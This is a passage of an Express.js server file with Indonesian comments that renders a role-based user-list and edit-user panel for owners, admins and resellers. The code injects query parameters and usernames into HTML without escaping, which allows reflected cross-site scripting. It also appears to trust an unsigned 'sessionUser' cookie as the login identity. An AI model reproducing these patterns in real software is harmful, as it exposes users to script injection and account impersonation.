      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - PIKACHU</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    /* Tombol Tambah User */
    .btn-add-user {
      display: inline-block;
      padding: 14px 30px;
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
      font-size: 14px;
      box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
    }

    .btn-add-user:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(78, 205, 196, 0.5);
      background: linear-gradient(135deg, #6BFFE6, #4ECDC4);
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
      
      .btn-add-user {
        padding: 12px 20px;
        font-size: 12px;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Tombol Tambah User Baru -->
    ${addUserButton}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - PIKACHU</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Error</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          background: #000; 
          color: #fff; 
          text-align: center; 
          padding: 50px; 
        }
        .error { 
          background: #333; 
          padding: 20px; 
          border-radius: 10px; 
          border: 1px solid #4ECDC4;
        }
        .btn {
          display: inline-block;
          padding: 10px 20px;
          background: #4ECDC4;
          color: #000;
          text-decoration: none;
          border-radius: 5px;
          margin-top: 15px;
          font-weight: bold;
        }
      </style>
    </head>
    <body>
      <div class="error">
        <h2>📝 Edit User</h2>
        <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
        <p><small>Parameter username tidak ditemukan</small></p>
        <a href="/userlist" class="btn">
          <i class="fas fa-arrow-left"></i> Kembali ke User List
        </a>
      </div>
    </body>
    </html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Error</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          background: #000; 
          color: #fff; 
          text-align: center; 
          padding: 50px; 
        }
        .error { 
          background: #333; 
          padding: 20px; 
          border-radius: 10px; 
          border: 1px solid #ff5555;
        }
      </style>
    </head>
    <body>
      <div class="error">
        <h2>❌ ERROR: User tidak ditemukan</h2>
        <p>User dengan username <strong>"${targetUsername}"</strong> tidak ditemukan dalam database.</p>
        <p>Silakan kembali ke <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
      </div>
    </body>
    </html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: 'Poppins', sans-serif;
        background: #000000;
        color: #F0F0F0;
        min-height: 100vh;
        padding: 20px;
        position: relative;
        overflow-y: auto; 
        overflow-x: hidden;
      }

      #particles {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
      }

      .content {
        position: relative;
        z-index: 2;
        max-width: 500px;
        margin: 0 auto;
      }

      .header {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
      }

      .header h2 {
        color: #F0F0F0;
        font-size: 24px;
        font-family: 'Orbitron', sans-serif;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
      }

      .header p {
        color: #A0A0A0;
        font-size: 14px;
      }

      .form-container {
        background: rgba(26, 26, 26, 0.9);
        border: 1px solid #333333;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        margin-bottom: 20px;
      }

      .user-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        border-left: 4px solid #F0F0F0;
      }

      .info-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 13px;
      }

      .info-label {
        color: #A0A0A0;
        font-weight: 600;
      }

      .info-value {
        color: #F0F0F0;
        font-weight: 500;
      }

      .role-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
      }

      .role-owner {
        background: linear-gradient(135deg, #FFD700, #FFA500);
        color: #000;
      }

      .role-admin {
        background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
        color: #fff;
      }

      .role-reseller {
        background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
        color: #000;
      }

      .role-user {
        background: linear-gradient(135deg, #95E1D3, #B5EAD7);
        color: #000;
      }

      .form-group {
        margin-bottom: 20px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #F0F0F0;
        font-family: 'Poppins', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      input, select {
        width: 100%;
        padding: 14px;
        border-radius: 8px;
        border: 1px solid #333333;
        background: rgba(38, 38, 38, 0.8);
        color: #F0F0F0;
        box-sizing: border-box;
        font-size: 14px;
        transition: all 0.3s ease;
      }

      input:focus, select:focus {
        outline: none;
        border-color: #F0F0F0;
        box-shadow: 0 0 10px rgba(240, 240, 240, 0.3);
      }

      .expired-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 12px;
        color: #A0A0A0;
        text-align: center;
        margin-top: -10px;
        margin-bottom: 20px;
        border: 1px dashed #333333;
      }

      .warning-text {
        color: #FF6B6B;
        font-weight: bold;
      }

      /* PERBAIKAN UTAMA: BUTTON GROUP YANG LEBIH RESPONSIVE */
      .button-group {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-top: 25px;
      }

      .btn {
        width: 100%;
        padding: 16px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        font-family: 'Orbitron', sans-serif;
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 1px;
        text-align: center;
        text-decoration: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .btn-save {
        background: rgba(240, 240, 240, 0.9);
        color: #000;
        order: 1;
      }

      .btn-save:hover {
        background: #F0F0F0;
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(240, 240, 240, 0.3);
      }

      .btn-delete {
        background: rgba(255, 107, 107, 0.2);
        color: #FF6B6B;
        border: 1px solid #FF6B6B;
        order: 2;
      }

      .btn-delete:hover {
        background: rgba(255, 107, 107, 0.3);
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(255, 107, 107, 0.2);
      }

      .btn-back {
        background: rgba(51, 51, 51, 0.8);
        color: #F0F0F0;
        border: 1px solid #333333;
        order: 3;
        margin-top: 10px;
      }

      .btn-back:hover {
        background: rgba(240, 240, 240, 0.1);
        border-color: #F0F0F0;
        transform: translateY(-2px);
      }

      .permission-note {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border-left: 3px solid #4ECDC4;
      }

      /* TAMPILAN DESKTOP */
      @media (min-width: 768px) {
        .button-group {
          flex-direction: row;
          flex-wrap: wrap;
        }
        
        .btn {
          flex: 1;
          min-width: 120px;
        }
        
        .btn-back {
          flex-basis: 100%;
          margin-top: 15px;
        }
      }

      @media (max-width: 500px) {
        body {
          padding: 16px;
        }

        .content {
          max-width: 100%;
        }

        .form-container {
          padding: 20px;
        }

        .button-group {
          gap: 10px;
        }

        .btn {
          padding: 14px 12px;
          font-size: 13px;
        }

        .header h2 {
          font-size: 20px;
        }
        
        .info-row {
          flex-direction: column;
          gap: 2px;
        }
      }

      /* Animasi */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .form-container {
        animation: fadeIn 0.6s ease-out;
      }
    </style>
  </head>
  <body>
    <!-- Efek Partikel -->
    <div id="particles"></div>

    <div class="content">
      <div class="header">
        <h2><i class="fas fa-edit"></i> EDIT USER</h2>
        <p>Manage user account and permissions</p>
      </div>

      <div class="form-container">
        <!-- User Information -->
        <div class="user-info">
          <div class="info-row">
            <span class="info-label">Current Username:</span>
            <span class="info-value">${targetUser.username}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Current Role:</span>
            <span class="info-value">
              <span class="role-badge role-${targetUser.role}">
                ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
              </span>
            </span>
          </div>
          <div class="info-row">
            <span class="info-label">Expiration:</span>
